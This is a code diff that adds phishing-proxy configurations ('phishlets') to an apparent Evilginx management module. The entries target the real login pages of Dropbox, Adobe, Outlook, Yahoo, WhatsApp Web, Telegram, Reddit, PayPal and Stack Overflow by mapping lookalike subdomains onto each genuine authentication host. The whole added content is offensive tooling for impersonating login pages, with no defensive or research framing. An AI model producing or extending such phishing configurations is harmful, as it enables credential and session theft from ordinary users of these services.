@@ -249,6 +249,166 @@ rewrite = "www.amazon.com"
 subdomain = "www"
 `,
   },
+  {
+    name: 'dropbox',
+    domain: 'dropbox.com',
+    description: 'Dropbox login / SSO page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "dropbox"
+author = "RedHawk"
+
+[subdomains]
+dropbox = "www.dropbox.com"
+
+[host_replace]
+rewrite = "www.dropbox.com"
+subdomain = "dropbox"
+
+[additional]
+redirect_url = "https://www.dropbox.com/home"
+`,
+  },
+  {
+    name: 'adobe',
+    domain: 'adobe.com',
+    description: 'Adobe ID login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "adobe"
+author = "RedHawk"
+
+[subdomains]
+adobeid = "auth.services.adobe.com"
+
+[host_replace]
+rewrite = "auth.services.adobe.com"
+subdomain = "adobeid"
+`,
+  },
+  {
+    name: 'outlook',
+    domain: 'outlook.live.com',
+    description: 'Outlook Web Access login',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "outlook"
+author = "RedHawk"
+
+[subdomains]
+outlook = "outlook.live.com"
+login = "login.live.com"
+
+[host_replace]
+rewrite = "outlook.live.com"
+subdomain = "outlook"
+`,
+  },
+  {
+    name: 'yahoo',
+    domain: 'login.yahoo.com',
+    description: 'Yahoo Mail / account login',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "yahoo"
+author = "RedHawk"
+
+[subdomains]
+login = "login.yahoo.com"
+
+[host_replace]
+rewrite = "login.yahoo.com"
+subdomain = "login"
+`,
+  },
+  {
+    name: 'whatsapp',
+    domain: 'web.whatsapp.com',
+    description: 'WhatsApp Web QR / login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "whatsapp"
+author = "RedHawk"
+
+[subdomains]
+web = "web.whatsapp.com"
+
+[host_replace]
+rewrite = "web.whatsapp.com"
+subdomain = "web"
+`,
+  },
+  {
+    name: 'telegram',
+    domain: 'telegram.org',
+    description: 'Telegram Web login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "telegram"
+author = "RedHawk"
+
+[subdomains]
+web = "web.telegram.org"
+telegram = "telegram.org"
+
+[host_replace]
+rewrite = "web.telegram.org"
+subdomain = "web"
+`,
+  },
+  {
+    name: 'reddit',
+    domain: 'reddit.com',
+    description: 'Reddit login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "reddit"
+author = "RedHawk"
+
+[subdomains]
+reddit = "www.reddit.com"
+accounts = "accounts.reddit.com"
+
+[host_replace]
+rewrite = "www.reddit.com"
+subdomain = "reddit"
+`,
+  },
+  {
+    name: 'paypal',
+    domain: 'paypal.com',
+    description: 'PayPal login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "paypal"
+author = "RedHawk"
+
+[subdomains]
+paypal = "www.paypal.com"
+
+[host_replace]
+rewrite = "www.paypal.com"
+subdomain = "paypal"
+`,
+  },
+  {
+    name: 'stackoverflow',
+    domain: 'stackoverflow.com',
+    description: 'Stack Overflow login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "stackoverflow"
+author = "RedHawk"
+
+[subdomains]
+stackoverflow = "stackoverflow.com"
+auth = "stackauth.com"
+
+[host_replace]
+rewrite = "stackoverflow.com"
+subdomain = "stackoverflow"
+`,
+  },
 ];
 
 export class EvilginxManager extends EventEmitter {
